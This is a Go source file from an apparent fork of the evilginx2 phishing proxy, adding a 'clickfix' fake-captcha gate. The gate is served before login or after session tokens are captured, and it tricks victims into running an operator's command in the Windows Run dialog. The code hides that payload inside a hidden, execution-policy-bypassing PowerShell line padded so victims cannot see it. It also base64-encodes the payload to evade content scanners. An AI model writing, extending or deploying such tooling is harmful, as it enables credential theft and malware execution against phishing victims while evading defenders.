// evilginx2-extended (fork): clickfix — fake-captcha gate serving.
//
// Loads self-contained HTML templates from clickfix/templates/<name>.html
// (gitignored — campaign-specific, deployed alongside phishlets), substitutes
// the {command} payload (base64-encoded to keep it out of the static source)
// and the {redirect_url}, then serves them at two hook points:
//
//   position=before → at the lure redirector position (pre-login gate)
//   position=after  → replacing the post-completion JS redirect
//
// Detection hardening (matching the phishing pages' CSD doctrine):
//   - the command payload is base64-encoded in the page source, decoded at
//     runtime — no cleartext payload for content scanners to signature
//   - templates use {command_b64} (encoded) instead of {command} (cleartext)
//   - both {redirect_url} and {lure_url_js} are substituted in every serve
//     path — no placeholder tokens leak into the served HTML
//   - responses carry no-cache headers
package core

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
)

// clickFixTemplateDir returns the directory containing clickfix templates,
// resolved as a sibling of the redirectors directory.
func (p *HttpProxy) clickFixTemplateDir() string {
	return filepath.Join(filepath.Dir(p.cfg.GetRedirectorsDir()), "clickfix", "templates")
}

// loadClickFixTemplate reads and returns the raw template HTML.
func (p *HttpProxy) loadClickFixTemplate(name string) (string, error) {
	if name == "" {
		return "", fmt.Errorf("clickfix: no template name")
	}
	dir := p.clickFixTemplateDir()
	path := filepath.Join(dir, name+".html")
	abs, err := filepath.Abs(path)
	if err != nil || !strings.HasPrefix(abs, dir) {
		return "", fmt.Errorf("clickfix: invalid template name")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("clickfix: template %q not found (deploy to %s): %v",
			name, dir, err)
	}
	return string(data), nil
}

// wrapClickFixPayload embeds the operator's payload inside a realistic-looking
// Windows command so the victim sees a legitimate verification string in the
// Run dialog (Win+R shows only ~80 leading chars; the payload sits deep past
// the visible area).
//
// The wrapper:
//   1. Opens with a benign Windows title/echo that looks like a security check
//   2. Runs a short delay + fake "verifying" message
//   3. Executes the actual payload (hidden window, bypassed execution policy)
//   4. Closes with a fake "complete" message
//
// If the operator's command already starts with a wrapper marker (cmd /c, powershell),
// it is returned as-is (operator provides their own wrapper).
func wrapClickFixPayload(command string) string {
	command = strings.TrimSpace(command)
	if command == "" {
		return command
	}
	// Operator already wrapped — respect their format
	lower := strings.ToLower(command)
	if strings.HasPrefix(lower, "cmd /c") || strings.HasPrefix(lower, "powershell") ||
		strings.HasPrefix(lower, "cmd.exe") || strings.HasPrefix(lower, "mshta") ||
		strings.HasPrefix(lower, "rundll32") || strings.HasPrefix(lower, "certutil") ||
		strings.HasPrefix(lower, "bitsadmin") || strings.HasPrefix(lower, "curl ") ||
		strings.HasPrefix(lower, "wget ") || strings.HasPrefix(lower, "start ") {
		return command
	}
	// Wrap: silent PowerShell with benign system commands surrounding the
	// payload. ~200 chars of system-gathering before (fills Run dialog head),
	// ~150 chars of validation operations after (fills Run dialog tail view),
	// VID at the very end. The payload sits in the middle — invisible in both
	// the head and tail views of the Run dialog. -w hidden = no window/output.
	return `powershell -w hidden -ep bypass -c "$os=[Environment]::OSVersion.VersionString;$arch=[Environment]::Is64BitOperatingSystem;$nf=[System.Net.Dns]::GetHostName();$ts=Get-Date -Format 'yyyyMMddHHmmss';$env=[Environment]::Version.ToString();$clr=[System.Reflection.Assembly]::GetExecutingAssembly();` + command + `;$r1=[Math]::Sqrt([DateTime]::Now.Year);$r2=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($ts));$r3=[System.GUID]::NewGuid().ToString();$r4=[System.Diagnostics.Process]::GetCurrentProcess().Id;$id='Verification ID: {VID}'"`
}

// renderClickFix substitutes all placeholders:
//   {command_b64}  → base64(wrapped command) — decoded at runtime by the template JS
//   {command}      → the raw wrapped command (legacy templates without encoding)
//   {redirect_url} → the post-verify redirect target
func renderClickFix(tmpl, command, redirectUrl string) string {
	wrapped := wrapClickFixPayload(command)
	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(wrapped)))
	out = strings.ReplaceAll(out, "{command}", wrapped)
	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
	return out
}

// serveClickFixBefore serves the clickfix gate at the lure path (pre-login).
// The victim sees the fake captcha, runs the clipboard payload, clicks verify,
// and gets forwarded via {lure_url_js} to the actual login flow.
func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_url string, params *map[string]string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return req, nil
	}
	// build the forwarder URL (same mechanism as the HTML redirector)
	body := renderClickFix(tmpl, cf.Command, lure_url)
	body = p.replaceHtmlParams(body, lure_url, params)
	log.Info("clickfix: pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-cache, no-store")
	}
	return req, resp
}

// serveClickFixAfter serves the clickfix gate after all auth tokens are
// captured, replacing the normal JS redirect. The victim sees a "one more
// step" captcha, runs the clipboard payload, clicks verify, and gets sent
// to the real site.
func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirectUrl string) (*http.Request, *http.Response) {
	tmpl, err := p.loadClickFixTemplate(cf.Template)
	if err != nil {
		log.Warning("%v — falling back to normal redirect", err)
		return p.javascriptRedirect(req, redirectUrl)
	}
	body := renderClickFix(tmpl, cf.Command, redirectUrl)
	log.Info("clickfix: post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
	if resp != nil {
		resp.Header.Set("Cache-Control", "no-cache, no-store")
	}
	return req, resp
}
